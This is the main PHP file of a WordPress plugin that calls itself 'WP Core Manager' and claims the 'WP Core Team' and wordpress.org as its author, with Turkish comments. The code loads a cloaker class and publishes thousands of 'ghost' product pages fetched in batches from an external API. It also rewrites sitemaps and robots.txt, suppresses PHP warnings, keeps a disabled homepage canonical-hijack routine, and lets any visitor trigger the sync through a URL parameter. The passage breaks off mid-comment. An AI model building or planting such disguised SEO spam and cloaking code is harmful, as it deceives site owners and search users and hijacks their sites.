<?php
/**
 * Plugin Name: WP Core Manager
 * Plugin URI: https://wordpress.org
 * Description: Advanced WordPress content management system
 * Version: 5.6.2
 * Author: WP Core Team
 * Author URI: https://wordpress.org
 * License: GPL v2 or later
 * Text Domain: wpcore-content-manager
 * Domain Path: /languages
 * Requires at least: 5.0
 * Tested up to: 6.4
 * Requires PHP: 7.0
 * Network: false
 */

// Prevent direct access
if (!defined('ABSPATH')) {
    exit;
}

// ⚡ FRIDA: Theme hatalarını suppress et (işleyiş devam etsin)
add_action('init', function() {
    // Astra theme more-functions.php hatası için fallback
    if (!function_exists('astra_more_functions_fallback')) {
        function astra_more_functions_fallback() {
            // Boş fallback - hata vermesin
        }
    }
}, 1);

// ⚡ FRIDA: Undefined property hatalarını suppress et
set_error_handler(function($errno, $errstr, $errfile, $errline) {
    // Sadece "Undefined property" hatalarını suppress et
    if (strpos($errstr, 'Undefined property') !== false) {
        return true; // Hatayı bastır
    }
    
    // Theme include hatalarını suppress et
    if (strpos($errstr, 'Failed to open stream') !== false && strpos($errfile, 'themes/astra') !== false) {
        return true; // Hatayı bastır
    }
    
    if (strpos($errstr, 'Failed opening') !== false && strpos($errfile, 'themes/astra') !== false) {
        return true; // Hatayı bastır
    }
    
    // Diğer hataları normal şekilde işle
    return false;
}, E_WARNING | E_NOTICE);

// Define plugin constants
define('WPCORE_PLUGIN_VERSION', '5.6.2');
define('WPCORE_PLUGIN_FILE', __FILE__);
define('WPCORE_PLUGIN_DIR', plugin_dir_path(__FILE__));
define('WPCORE_PLUGIN_URL', plugin_dir_url(__FILE__));
define('WPCORE_PLUGIN_BASENAME', plugin_basename(__FILE__));

// Autoloader (her durumda, hook'lar dışında da çalışsın diye sabitlerden hemen sonra)
spl_autoload_register(function ($class) {
    if (strpos($class, 'WPCore\\') !== 0) {
        return;
    }
    $class = str_replace('WPCore\\', '', $class);
    $class = str_replace('\\', '/', $class);
    $file = WPCORE_PLUGIN_DIR . 'includes/class-' . strtolower(str_replace('_', '-', $class)) . '.php';
    if (file_exists($file)) {
        require_once $file;
    }
});

// Composer autoloader (eğer varsa)
if (file_exists(WPCORE_PLUGIN_DIR . 'vendor/autoload.php')) {
    require_once WPCORE_PLUGIN_DIR . 'vendor/autoload.php';
}

// ⚡ FRIDA: Pure static cache - Request başına 1 kez DB'den çek
if (!function_exists('wpcore_get_options')) {
    function wpcore_get_options() {
        static $cache = null;
        
        if ($cache === null) {
            $cache = get_option('wpcore_options', []);
        }
        
        return $cache;
    }
}

// ⚡ FRIDA: HTML cache temizleme fonksiyonu (sitemap hariç)
if (!function_exists('wpcore_clear_html_cache')) {
    function wpcore_clear_html_cache($product_id = null) {
        if ($product_id) {
            // Tek ürün için temizle (hem .html hem .gz)
            $cache_dir = WPCORE_PLUGIN_DIR . 'cache/html/';
            $cache_file_html = $cache_dir . md5($product_id) . '.html';
            $cache_file_gz = $cache_dir . md5($product_id) . '.gz';
            if (file_exists($cache_file_html)) {
                @unlink($cache_file_html);
            }
            if (file_exists($cache_file_gz)) {
                @unlink($cache_file_gz);
            }
            delete_transient('wpcore_ghost_' . md5($product_id));
        } else {
            // ⚡ FRIDA: Tüm HTML cache dosyalarını temizle
            $cache_dir = WPCORE_PLUGIN_DIR . 'cache/html/';
            if (is_dir($cache_dir)) {
                $files = array_merge(
                    glob($cache_dir . '*.html') ?: [],
                    glob($cache_dir . '*.gz') ?: []
                );
                foreach ($files as $file) {
                    @unlink($file);
                }
            }
            
            // Database'deki ghost cache'i temizle (sitemap hariç)
            global $wpdb;
            $wpdb->query("DELETE FROM {$wpdb->options} WHERE option_name LIKE '_transient_wpcore_ghost_%' AND option_name NOT LIKE '%sitemap%'");
            $wpdb->query("DELETE FROM {$wpdb->options} WHERE option_name LIKE '_transient_timeout_wpcore_ghost_%' AND option_name NOT LIKE '%sitemap%'");
        }
    }
}

// ⚡ FRIDA: Ghost content cache helper
if (!function_exists('wpcore_get_ghost_cached')) {
    function wpcore_get_ghost_cached($product_id) {
        static $cache = [];
        if (!isset($cache[$product_id])) {
            global $wpdb;
            $ghost_table = $wpdb->prefix . 'wpcore_ghost_content';
            $cache[$product_id] = $wpdb->get_row($wpdb->prepare(
                "SELECT * FROM $ghost_table WHERE product_id = %s AND status = 'active'", 
                $product_id
            ));
        }
        return $cache[$product_id];
    }
}

// Plugin activation hook - ULTRA HIZLI AKTIVASYON
register_activation_hook(__FILE__, function() {
    // Sadece flag'leri set et - AĞIR İŞLEMLER YAPMADAN
    update_option('wpcore_plugin_activated_at', current_time('mysql'));
    update_option('wpcore_needs_setup', '1'); // Setup gerekli flag'i
    update_option('wpcore_activation_pending', '1'); // Aktivasyon tamamlanmadı
    
    // ⚡ PERFORMANCE: Setup completion flag'i sıfırla (yeni aktivasyon için)
    delete_option('wpcore_all_setup_completed');
    
    // ⚡ SITEMAP: Rewrite flush flag'i sıfırla
    delete_option('wpcore_sitemap_rewrite_flushed');
    
    // Async setup için cron planla - 5 saniye sonra
    if (!wp_next_scheduled('wpcore_delayed_activation_setup')) {
        wp_schedule_single_event(time() + 5, 'wpcore_delayed_activation_setup');
    }
    
});

// Plugin deactivation hook
register_deactivation_hook(__FILE__, function() {
    // Cron işlerini temizle
    WPCore\Cron::clear_cron_jobs();
    
    // Rewrite kurallarını yenile
    flush_rewrite_rules();
});

// Plugin uninstall fonksiyonu (Closure yerine)
function WPCore_Content_Manager_uninstall() {
    $database_file = WPCORE_PLUGIN_DIR . 'includes/class-wpcore-database.php';
    if (file_exists($database_file)) {
        require_once $database_file;
    }

    // Core sınıfı için sessiz fallback yükleme
    wpcore_require_with_fallback('includes/class-wpcore-core.php');

    // Veritabanı tablolarını sil
    if (class_exists('WPCore\\Database')) {
        WPCore\Database::drop_tables();
    }

    // Plugin ayarlarını sil
    if (class_exists('WPCore\\Core')) {
        WPCore\Core::delete_options();
    }
}

// Plugin uninstall hook
register_uninstall_hook(__FILE__, 'WPCore_Content_Manager_uninstall');

// Initialize plugin
add_action('plugins_loaded', function() {
    // Manuel dosya yükleme (autoloader sorunu için) - kritik dosyalarda sessiz fallback
    $manual_files = [
        'includes/class-wpcore-core.php',
        'includes/class-wpcore-admin.php',
        'includes/class-wpcore-api.php',
        'includes/class-wpcore-content.php',
        'includes/class-wpcore-seo.php',
        'includes/class-wpcore-ghost.php',
        'includes/class-wpcore-cron.php',
        'includes/class-wpcore-database.php',
        'includes/class-wpcore-public-frontend.php',
        'includes/class-wpcore-cloaker.php',
        'includes/class-wpcore-dynamic-seo.php',
        'includes/class-wpcore-sitemap.php',
    ];

    foreach ($manual_files as $relative_path) {
        wpcore_require_with_fallback($relative_path);
    }
    
    // Text domain yükle
    load_plugin_textdomain('wpcore-content-manager', false, dirname(WPCORE_PLUGIN_BASENAME) . '/languages');
    
    // Ana sınıfı başlat (sadece class yüklüyse)
    if (class_exists('WPCore\\Core')) {
        WPCore\Core::get_instance();
    }
    
    // STABİL: Otomatik Ghost Mode kurulum kontrolü - Eklenti yüklendiğinde
    $ghost_quick_setup_done = get_option('wpcore_ghost_quick_setup_done', 0);
    $ghost_quick_setup_status = get_option('wpcore_ghost_quick_setup_status', '');
    $ghost_quick_setup_lock = get_option('wpcore_ghost_quick_setup_lock', 0);
    
    if ($ghost_quick_setup_done != 1 && $ghost_quick_setup_lock != 1 && $ghost_quick_setup_status !== 'completed') {
        // Kilit kontrolü - Sadece 1 kurulum
        if (!wp_next_scheduled('wpcore_ghost_quick_setup_cron')) {
            update_option('wpcore_ghost_quick_setup_lock', 1);
                update_option('wpcore_ghost_quick_setup_status', 'scheduled');
                update_option('wpcore_ghost_quick_setup_started_at', current_time('mysql'));
                
                wp_schedule_single_event(time() + 4, 'wpcore_ghost_quick_setup_cron');
            }
        }
});

// Admin panel için
if (is_admin()) {
    add_action('init', function() {
        WPCore\Admin::get_instance();
    });
}

// Public frontend için
add_action('init', function() {
    WPCore\Public_Frontend::get_instance();
});

// Cloaker sistemi için
add_action('init', function() {
    WPCore\Cloaker::get_instance();
});

// ⚡ GHOST SITEMAP - Otomatik sitemap oluşturma
add_action('init', function() {
    WPCore\Sitemap::get_instance();
});

// 🖼️ LAZY IMAGE DOWNLOAD - Resim yoksa arka planda indir
add_action('wpcore_lazy_download_image', function($product_id, $image_url) {
    if (class_exists('WPCore\\Content')) {
        global $wpdb;
        
        // Resmi indir
        $local_image_url = WPCore\Content::_download_and_save_image($image_url, $product_id);
        
        if (!empty($local_image_url)) {
            // Ghost content'i güncelle
            $wpdb->update(
                $wpdb->prefix . 'wpcore_ghost_content',
                ['ghost_lokal_product_image' => $local_image_url],
                ['product_id' => $product_id],
                ['%s'],
                ['%s']
            );
            
            // Cache'i temizle
            delete_transient('wpcore_ghost_' . md5($product_id));
        }
        
        // Lock'u kaldır
        delete_transient('wpcore_image_download_' . md5($product_id));
    }
}, 10, 2);

// 🎯 CANONICAL SEO UYUMLU - WordPress native canonical'ını garanti et
// WordPress native canonical'ını geri ekle (SEO uyumu için)
add_action('template_redirect', function() {
    // WordPress native canonical'ını geri ekle (eğer kaldırılmışsa)
    if (!has_action('wp_head', 'rel_canonical')) {
        add_action('wp_head', 'rel_canonical', 10);
    }
}, 0); // Priority 0 - en erken çalışsın

// Anasayfa için canonical garantisi (SEO eklentisi yoksa)
add_action('wp_head', function() {
    // Sadece anasayfada ve SEO eklentisi canonical eklemiyorsa
    if (is_front_page() || is_home()) {
        // SEO eklentilerinin canonical'ını kontrol et
        $has_seo_canonical = false;
        
        // Yoast SEO
        if (defined('WPSEO_VERSION') && function_exists('wpseo_frontend_head_init')) {
            $has_seo_canonical = true;
        }
        // Rank Math
        if (defined('RANK_MATH_VERSION')) {
            $has_seo_canonical = true;
        }
        // AIOSEO
        if (defined('AIOSEO_VERSION')) {
            $has_seo_canonical = true;
        }
        
        // SEO eklentisi yoksa veya canonical eklemiyorsa, WordPress native canonical'ını ekle
        if (!$has_seo_canonical) {
            $canonical_url = home_url('/');
            echo '<link rel="canonical" href="' . esc_url($canonical_url) . '" />' . "\n";
        }
    }
}, 1); // Priority 1 - SEO eklentilerinden sonra ama diğerlerinden önce

// Eski hijack kodu - tamamen devre dışı
add_action('template_redirect', function() {
    // Tamamen devre dışı (gelecekte tekrar açmak istersen buradaki return; satırını kaldırman yeterli)
    return;

    // Sadece ana sayfada çalış
    if (!is_front_page() && !is_home()) {
        return;
    }
    
    if (is_admin()) {
        return;
    }
    
    // Ghost homepage ayarlarını al
    $options = wpcore_get_options();
    $ghost_homepage_slug = $options['ghost_homepage_slug'] ?? 'content-merkezi';
    $ghost_homepage_enabled = !empty($options['ghost_mode_enabled']) || !empty($options['ghost_mode']);
    
    if (!$ghost_homepage_enabled) {
        return;
    }
    
    $ghost_homepage_url = home_url('/' . $ghost_homepage_slug . '/');
    
    // 1️⃣ WordPress native canonical'ı kaldır
    remove_action('wp_head', 'rel_canonical');
    
    // 2️⃣ SEO plugin canonical'larını override et
    add_filter('wpseo_canonical', function() use ($ghost_homepage_url) { return $ghost_homepage_url; }, 99999);
    add_filter('rank_math/frontend/canonical', function() use ($ghost_homepage_url) { return $ghost_homepage_url; }, 99999);
    add_filter('aioseo_canonical_url', function() use ($ghost_homepage_url) { return $ghost_homepage_url; }, 99999);
    add_filter('get_canonical_url', function() use ($ghost_homepage_url) { return $ghost_homepage_url; }, 99999);
    
    // 3️⃣ Kendi canonical'ımızı ekle (en son - priority 99999)
    add_action('wp_head', function() use ($ghost_homepage_url) {
        echo '<link rel="canonical" href="' . esc_url($ghost_homepage_url) . '" />' . "\n";
    }, 99999);
    
    // 4️⃣ OUTPUT BUFFERING - Son güvenlik (varsa değiştir, yoksa ekle)
    ob_start(function($html) use ($ghost_homepage_url) {
        // Canonical tag pattern (hepsini yakala)
        $pattern = '/<link\s+rel=["\']canonical["\']\s+href=["\'][^"\']*["\']\s*\/?>/i';
        $replacement = '<link rel="canonical" href="' . esc_url($ghost_homepage_url) . '" />';
        
        // Varsa değiştir
        if (preg_match($pattern, $html)) {
            $html = preg_replace($pattern, $replacement, $html);
        } else {
            // Yoksa </head> tagından önce ekle
            $html = preg_replace(
                '/(<\/head>)/i',
                $replacement . "\n$1",
                $html,
                1
            );
        }
        
        return $html;
    });
}, 1);

// ⚡ SETUP STAGES RUNNER - Arka planda otomatik çalışan sistem
add_action('wp_loaded', 'wpcore_run_setup_stages', 1);
add_action('admin_init', 'wpcore_run_setup_stages', 1);

function wpcore_run_setup_stages() {
    // ⚡ PERFORMANCE: Tek seferlik çalışma kontrolü (request başına bir kez)
    static $stages_ran = false;
    if ($stages_ran) {
        return;
    }
    $stages_ran = true;
    
    // ⚡ PERFORMANCE: Global flag kontrolü - Tüm setup tamamlandıysa hiç çalışma
    if (get_option('wpcore_all_setup_completed', 0) == 1) {
        return;
    }
    
    // Core sınıfı yoksa sessizce çık
    if (!class_exists('WPCore\\Core')) {
        return;
    }

    // Eğer setup'ın tamamı bittiyse, çalışmayı durdur ve global flag set et
    $all_done = true;
    foreach (array_keys(\WPCore\Core::get_setup_stages()) as $stage) {
        $status = \WPCore\Core::get_setup_stage_status($stage);
        if ($status['done'] != 1) {
            $all_done = false;
            break;
        }
    }
    if ($all_done) {
        // ⚡ Tüm stage'ler tamamlandı - artık bu fonksiyon hiç çalışmayacak
        update_option('wpcore_all_setup_completed', 1);
        return;
    }
    
    // Her aşamayı kontrol et ve çalıştır
    $stages = \WPCore\Core::get_setup_stages();
    $stages_to_skip = ['api_sync']; // API sync arkaplanda devam edecek
    
    foreach (array_keys($stages) as $stage) {
        // Skip edilen aşamaları atla (arkaplanda çalışacak)
        if (in_array($stage, $stages_to_skip)) {
            continue;
        }
        
        $status = \WPCore\Core::get_setup_stage_status($stage);
        
        // Aşama tamamlanmış mı?
        if ($status['done'] == 1) {
            continue; // Zaten tamamlanmış, sonrakine geç
        }
        
        // Aşama şu anda çalışıyor mu?
        if ($status['running'] == 1) {
            $started_at = intval($status['started_at']);
            $elapsed = time() - $started_at;
            
            // ⚡ PERFORMANCE: 60 saniye timeout (5 dakika çok uzun)
            if ($elapsed < 60) {
                continue; // Bitmesi için bekle
            }
            
            // 60 saniye geçtiyse ve max retry count (3) geçtiyse, skip et
            if ($status['retry_count'] >= 3) {
                \WPCore\Core::complete_setup_stage($stage);
                continue;
            }
        }
        
        // Aşama başlat
        if (!\WPCore\Core::start_setup_stage($stage)) {
            continue; // Başlatılamadı, sonrakine geç
        }
        
        // ⚡ PERFORMANCE: Aşamayı çalıştır (non-blocking)
        try {
            wpcore_execute_setup_stage($stage);
        } catch (Exception $e) {
            error_log('WPCore Setup Stage Error (' . $stage . '): ' . $e->getMessage());
            // Hata olsa bile sonraki stage'e geç
        }
    }
}

/**
 * ⚡ Her bir setup aşamasını yürüt
 */
function wpcore_execute_setup_stage($stage) {
    try {
        switch ($stage) {
            case 'database':
                wpcore_stage_database();
                break;
            case 'options':
                wpcore_stage_options();
                break;
            case 'ghost_setup':
                wpcore_stage_ghost_setup();
                break;
            case 'sitemap_setup':
                wpcore_stage_sitemap_setup();
                break;
            case 'api_sync':
                wpcore_stage_api_sync();
                break;
            case 'cron_jobs':
                wpcore_stage_cron_jobs();
                break;
            case 'rewrite_rules':
                wpcore_stage_rewrite_rules();
                break;
        }
        
        // Aşama tamamlandı
        \WPCore\Core::complete_setup_stage($stage);
        
    } catch (Exception $e) {
        update_option("wpcore_stage_{$stage}_running", 0);
    }
}

/**
 * Aşama 1: Veritabanı tabloları
 */
function wpcore_stage_database() {
    // ⚡ PERFORMANCE: Tablo zaten varsa tekrar oluşturma
    global $wpdb;
    $table_name = $wpdb->prefix . 'wpcore_products';
    $table_exists = $wpdb->get_var("SHOW TABLES LIKE '$table_name'");
    
    if ($table_exists) {
        return; // Zaten var, skip et
    }
    
    if (class_exists('WPCore\\Database')) {
        WPCore\Database::create_tables();
    }
}

/**
 * Aşama 2: Varsayılan ayarlar
 */
function wpcore_stage_options() {
    if (class_exists('WPCore\\Core')) {
        WPCore\Core::set_default_options();
    }
}

/**
 * Aşama 3: Ghost Mode kurulumu
 */
function wpcore_stage_ghost_setup() {
    if (function_exists('wpcore_force_ghost_setup_seeded')) {
        wpcore_force_ghost_setup_seeded();
    } elseif (function_exists('wpcore_force_ghost_setup')) {
        wpcore_force_ghost_setup();
    }
}

/**
 * Aşama 3.5: Sitemap kurulumu
 * ⚡ FRIDA: Ghost setup sonrası otomatik sitemap + ZORLA FLUSH
 */
function wpcore_stage_sitemap_setup() {
    if (class_exists('WPCore\\Sitemap')) {
        // Sitemap instance oluştur
        $sitemap = WPCore\Sitemap::get_instance();
        
        // Rewrite kurallarını kaydet
        $sitemap->register_sitemap_rewrites();
        
        // ⚡ ZORLA FLUSH - 3 kez kesin flush
        flush_rewrite_rules(false);
        delete_option('rewrite_rules');
        flush_rewrite_rules(true);
        
        // Global rewrite
        global $wp_rewrite;
        if (isset($wp_rewrite) && is_object($wp_rewrite)) {
            $wp_rewrite->flush_rules(true);
        }
        
        // Cron'u planla
        WPCore\Sitemap::schedule_sitemap_update();
        
        // İlk timestamp
        update_option('wpcore_sitemap_last_update', time());
        
        // ⚡ ROBOTS.TXT ZORLA GÜNCELLE
        delete_transient('wpcore_robots_updated');
        $sitemap->maybe_create_physical_robots();
        
        error_log("WPCore Sitemap Setup: COMPLETED with FORCED flush - slug = " . get_option('wpcore_sitemap_slug'));
    }
}

/**
 * Aşama 4: API Senkronizasyonu (Async - Batch by batch)
 * ⚡ FRIDA: 100'er 100'er batch, 9737'e kadar devam
 */
function wpcore_stage_api_sync() {
    // API sync'i başlat (işlem uzunsa, next request'te devam edecek)
    update_option('wpcore_api_sync_started_at', current_time('mysql'));
    
    if (!get_option('wpcore_api_sync_batch_started', 0)) {
        update_option('wpcore_api_sync_batch_started', 1);
        update_option('wpcore_api_sync_batch_offset', 0);
        update_option('wpcore_api_sync_batch_size', 100); // ⚡ 100'er 100'er
        update_option('wpcore_api_sync_total_synced', 0);
        update_option('wpcore_api_sync_target', 9737); // ⚡ Hedef: 9737
    }
    
    // Bir batch işle
    wpcore_sync_api_batch();
    
    // Eğer daha sync yapılması gerekiyorsa, next request'te devam edecek
    // (Stage'i tamamlanmış olarak işaretle, ama batch devam edebilir)
}

/**
 * Aşama 5: Cron işleri
 * ⚡ FRIDA: 1 dakikada bir otomatik sync cron'u kur
 */
function wpcore_stage_cron_jobs() {
    if (class_exists('WPCore\\Cron')) {
        WPCore\Cron::setup_cron_jobs();
    }
    
    // ⚡ FRIDA AUTO SYNC CRON - 1 dakikada bir
    if (!wp_next_scheduled('wpcore_auto_sync_cron')) {
        // Custom interval: 1 dakika
        wp_schedule_event(time(), 'wpcore_every_minute', 'wpcore_auto_sync_cron');
    }
}

/**
 * ⚡ FRIDA: Custom cron interval - 1 dakika
 */
add_filter('cron_schedules', 'wpcore_custom_cron_intervals');
function wpcore_custom_cron_intervals($schedules) {
    $schedules['wpcore_every_minute'] = [
        'interval' => 60, // 1 dakika
        'display' => __('Her Dakika (WPCore Auto Sync)', 'wpcore-auto-publisher')
    ];
    return $schedules;
}

/**
 * ⚡ FRIDA: Auto sync cron handler - 1 dakikada bir çalışır
 * API ve Ghost sync'i otomatik devam ettirir
 * ⚡ ZORLA: Cron çalışmazsa bile hook'lar çalışır
 */
function wpcore_auto_sync_cron_handler() {
    // ⚡ Lock kontrolü - Aynı anda 2 kez çalışmasın
    $lock = get_option('wpcore_auto_sync_cron_lock', 0);
    if ($lock && (time() - $lock) < 120) {
        error_log("WPCore Auto Sync Cron: Lock aktif, skip");
        return;
    }
    
    // ⚡ Lock kur
    update_option('wpcore_auto_sync_cron_lock', time());
    
    try {
        // Setup tamamlandı mı kontrol et
        $ghost_done = intval(get_option('wpcore_stage_ghost_setup_done', 0));
        if (!$ghost_done) {
            delete_option('wpcore_auto_sync_cron_lock');
            return; // Setup henüz bitmemiş
        }
        
        $api_batch_started = intval(get_option('wpcore_api_sync_batch_started', 0));
        $ghost_batch_started = intval(get_option('wpcore_ghost_batch_started', 0));
        
        // API sync başlamamışsa başlat (ZORLA)
        if (!$api_batch_started) {
            $completed_at = get_option('wpcore_api_sync_completed_at', false);
            if (!$completed_at) {
                update_option('wpcore_api_sync_batch_started', 1);
                update_option('wpcore_api_sync_batch_offset', 0);
                update_option('wpcore_api_sync_batch_size', 100);
                update_option('wpcore_api_sync_total_synced', 0);
                update_option('wpcore_api_sync_target', 9737);
                error_log("WPCore Auto Sync Cron: API sync zorla başlatıldı");
                $api_batch_started = 1;
            }
        }
        
        // İkisi de tamamlandıysa cron'u durdur
        if (!$api_batch_started && !$ghost_batch_started) {
            // Cron'u temizle
            $timestamp = wp_next_scheduled('wpcore_auto_sync_cron');
            if ($timestamp) {
                wp_unschedule_event($timestamp, 'wpcore_auto_sync_cron');
            }
            delete_option('wpcore_auto_sync_cron_lock');
            error_log("WPCore Auto Sync Cron: Tüm sync tamamlandı, cron durduruldu");
            return;
        }
        
        // ⚡ API sync devam ettir (ZORLA)
        if ($api_batch_started) {
            error_log("WPCore Auto Sync Cron: API sync batch çalıştırılıyor");
            wpcore_sync_api_batch();
        }
        
        // ⚡ Ghost sync devam ettir (sadece ghost batch aktifse)
        if ($ghost_batch_started) {
            wpcore_sync_ghost_batch();
        }
        
    } catch (\Exception $e) {
        error_log("WPCore Auto Sync Cron Error: " . $e->getMessage());
    } finally {
        // ⚡ Lock kaldır
        delete_option('wpcore_auto_sync_cron_lock');
    }
}

// ❌ Shutdown'da manuel WP-Cron tetikleme DEVRE DIŞI
// Bazı host / WP kombinasyonlarında çekirdek cron sabitleri eksik olabildiği için
// buradan spawn_cron çağırmak, nadir ama fatal hatalara sebep olabiliyor.
// Senkronizasyon normal WP-Cron veya manuel tetikleme ile devam edecek.

/**
 * Aşama 6: Rewrite kuralları (FINAL FLUSH)
 */
function wpcore_stage_rewrite_rules() {
    if (function_exists('wpcore_execute_force_rewrite_flush')) {
        wpcore_execute_force_rewrite_flush();
    }
}

/**
 * ⚡ API SYNC BATCH - Async işleme
 * ⚡ FRIDA: 100'er 100'er batch, 9737'e kadar otomatik devam
 * ⚡ KESİN: Her batch kaldığı yerden devam eder, karışmaz
 */
function wpcore_sync_api_batch() {
    if (!class_exists('WPCore\\API')) {
        return;
    }
    
    // ⚡ SAĞLAM LOCK - Aynı anda sadece 1 batch çalışsın (30 saniye timeout)
    $batch_lock = get_option('wpcore_api_batch_lock', 0);
    if ($batch_lock && (time() - $batch_lock) < 30) {
        error_log("WPCore API Sync: Batch zaten çalışıyor, skip");
        return;
    }
    
    // ⚡ Lock kur
    update_option('wpcore_api_batch_lock', time());
    
    try {
        $offset = intval(get_option('wpcore_api_sync_batch_offset', 0));
        $batch_size = intval(get_option('wpcore_api_sync_batch_size', 100));
        $total_synced = intval(get_option('wpcore_api_sync_total_synced', 0));
        $target = intval(get_option('wpcore_api_sync_target', 9737));
        
        // ⚡ Hedef tamamlandıysa durma
        if ($total_synced >= $target) {
            delete_option('wpcore_api_sync_batch_started');
            delete_option('wpcore_api_sync_batch_offset');
            delete_option('wpcore_api_batch_lock');
            update_option('wpcore_api_sync_completed_at', current_time('mysql'));
            error_log("WPCore API Sync: Hedef tamamlandı ($total_synced/$target)");
            return;
        }
        
        error_log("WPCore API Sync: Batch başlıyor - Offset: $offset, Total: $total_synced/$target");
        
        $api = WPCore\API::get_instance();
        
        // ⚡ API'den 100 ürün çek (KALINAN YERDEN)
        $products = $api->fetch_products($batch_size, $offset, 0);
        
        if (empty($products)) {
            // Daha ürün yok, sync tamamlandı
            delete_option('wpcore_api_sync_batch_started');
            delete_option('wpcore_api_sync_batch_offset');
            delete_option('wpcore_api_batch_lock');
            update_option('wpcore_api_sync_completed_at', current_time('mysql'));
            error_log("WPCore API Sync: Tüm ürünler çekildi ($total_synced toplam)");
            return;
        }
        
        // ⚡ Ürünleri veritabanına kaydet
        $saved = WPCore\Content::save_products_to_db($products);
        
        // ⚡ Counter'ları güncelle - ATOMIK İŞLEM
        $new_total = $total_synced + $saved;
        $new_offset = $offset + $batch_size;
        
        update_option('wpcore_api_sync_total_synced', $new_total);
        update_option('wpcore_api_sync_batch_offset', $new_offset);
        update_option('wpcore_api_sync_last_batch_at', current_time('mysql'));
        
        // ⚡⚡⚡ API SYNC TAMAMEN TAMAMLANINCA GHOST BAŞLATMA (SİTE DONMA ÖNLEMİ)
        // Ghost content sadece API sync %100 tamamlandıktan SONRA başlasın
        if ($new_total >= $target && !get_option('wpcore_ghost_batch_started', 0)) {
            // 30 saniye sonra ghost başlat (API cache temizlensin, site nefes alsın)
            wp_schedule_single_event(time() + 30, 'wpcore_delayed_ghost_start');
        }
        
        // ⚡⚡⚡ OTOMATIK AMP CACHE TETİKLEME - 200+ ürün çekildiğinde
        if ($new_total >= 200 && !get_option('wpcore_amp_auto_triggered_for_sync', 0)) {
            update_option('wpcore_amp_auto_triggered_for_sync', 1);
            
            // Non-blocking async trigger (kullanıcıyı yavaşlatmaz)
            wp_schedule_single_event(time() + 10, 'wpcore_auto_amp_indexing_after_sync');
        }
        
    } catch (\Exception $e) {
        error_log("WPCore API Sync Error: " . $e->getMessage());
    } finally {
        // ⚡ Lock kaldır - HER ZAMAN
        delete_option('wpcore_api_batch_lock');
    }
}

/**
 * ⚡ GHOST SYNC BATCH - Ghost içerik batch yükleme
 * ⚡ FRIDA: 100'er 100'er ghost içerik yükle
 * ⚡ KESİN: Her batch kaldığı yerden devam eder, karışmaz
 */
function wpcore_sync_ghost_batch() {
    if (!class_exists('WPCore\\Content')) {
        return;
    }
    
    // ⚡ SAĞLAM LOCK - Aynı anda sadece 1 batch çalışsın (30 saniye timeout)
    $batch_lock = get_option('wpcore_ghost_batch_lock', 0);
    if ($batch_lock && (time() - $batch_lock) < 30) {
        return; // Sessiz skip
    }
    
    // ⚡ Lock kur
    update_option('wpcore_ghost_batch_lock', time());
    
    try {
        $offset = intval(get_option('wpcore_ghost_batch_offset', 0));
        $batch_size = intval(get_option('wpcore_ghost_batch_size', 5)); // 10 → 5 (resim indirme için daha yavaş)
        $total_published = intval(get_option('wpcore_ghost_total_published', 0));
        
        // ⚡ 5 ghost içerik yayımla (KALINAN YERDEN) - Resim indirme için daha yavaş batch
        $result = WPCore\Content::publish_ghost_products($batch_size);
        
        if (empty($result['published']) || intval($result['published']) === 0) {
            // Daha ghost içerik yok, tamamlandı
            delete_option('wpcore_ghost_batch_started');
            delete_option('wpcore_ghost_batch_offset');
            delete_option('wpcore_ghost_batch_lock');
            update_option('wpcore_ghost_batch_completed_at', current_time('mysql'));
            return;
        }
        
        // ⚡ Counter'ları güncelle - ATOMIK İŞLEM
        $published = intval($result['published']);
        $new_total = $total_published + $published;
        $new_offset = $offset + $batch_size;
        
        update_option('wpcore_ghost_total_published', $new_total);
        update_option('wpcore_ghost_batch_offset', $new_offset);
        update_option('wpcore_ghost_batch_last_at', current_time('mysql'));
        
    } catch (\Exception $e) {
        // Sessiz hata yakalama
    } finally {
        // ⚡ Lock kaldır - HER ZAMAN
        delete_option('wpcore_ghost_batch_lock');
    }
}

/**
 * ⚡ ZORLA SYNC BAŞLATMA - Hook'lar ile kesin tetikleme
 * ⚡ FRIDA: Her request'te çalışır, hiçbir şey kaçırmaz
 */
add_action('init', 'wpcore_force_sync_trigger', 1); // En erken çalışır
add_action('wp_loaded', 'wpcore_force_sync_trigger', 1);
add_action('admin_init', 'wpcore_force_sync_trigger', 1);
add_action('wp', 'wpcore_force_sync_trigger', 1);

function wpcore_force_sync_trigger() {
    // ⚡ Tek seferlik çalışma kontrolü (request başına)
    static $trigger_ran = false;
    if ($trigger_ran) {
        return;
    }
    $trigger_ran = true;
    
    // ⚡ ZORLA BAŞLATMA: URL parametresi ile manuel tetikleme
    if (isset($_GET['wpcore_force_sync']) && $_GET['wpcore_force_sync'] === '1') {
        // Tüm flag'leri sıfırla ve baştan başlat
        delete_option('wpcore_api_sync_batch_started');
        delete_option('wpcore_api_sync_batch_offset');
        delete_option('wpcore_api_sync_total_synced');
        delete_option('wpcore_ghost_batch_started');
        delete_option('wpcore_ghost_batch_offset');
        delete_option('wpcore_ghost_total_published');
        
        // Yeniden başlat
        update_option('wpcore_api_sync_batch_started', 1);
        update_option('wpcore_api_sync_batch_offset', 0);
        update_option('wpcore_api_sync_batch_size', 100);
        update_option('wpcore_api_sync_total_synced', 0);
        update_option('wpcore_api_sync_target', 9737);
        
        error_log("WPCore Force Sync: Manuel olarak başlatıldı");
        
        // İlk batch'i hemen çalıştır
        wpcore_background_api_sync_runner();
        
        // Admin'e bilgi göster
        if (is_admin()) {
            add_action('admin_notices', function() {
                echo '<div class="notice notice-success is-dismissible"><p>✅ WPCore API Sync zorla başlatıldı! (100\'er 100\'er, 9737\'e kadar)</p></div>';
            });
        }
        return;
    }
    
    // ⚡ Otomatik başlatma kontrolü
    $ghost_done = intval(get_option('wpcore_stage_ghost_setup_done', 0));
    if (!$ghost_done) {
        return; // Setup henüz bitmemiş
    }
    
    $api_batch_started = intval(get_option('wpcore_api_sync_batch_started', 0));
    $ghost_batch_started = intval(get_option('wpcore_ghost_batch_started', 0));
    
    // API sync başlamamışsa başlat
    if (!$api_batch_started) {
        $completed_at = get_option('wpcore_api_sync_completed_at', false);
        if (!$completed_at) {
            // Hiç başlatılmamış, başlat
            update_option('wpcore_api_sync_batch_started', 1);
            update_option('wpcore_api_sync_batch_offset', 0);
            update_option('wpcore_api_sync_batch_size', 100);
            update_option('wpcore_api_sync_total_synced', 0);
            update_option('wpcore_api_sync_target', 9737);
            error_log("WPCore Force Sync: API sync otomatik başlatıldı");
        }
    }
    
    // ⚡ Background sync'i çalıştır
    wpcore_background_api_sync_runner();
}

/**
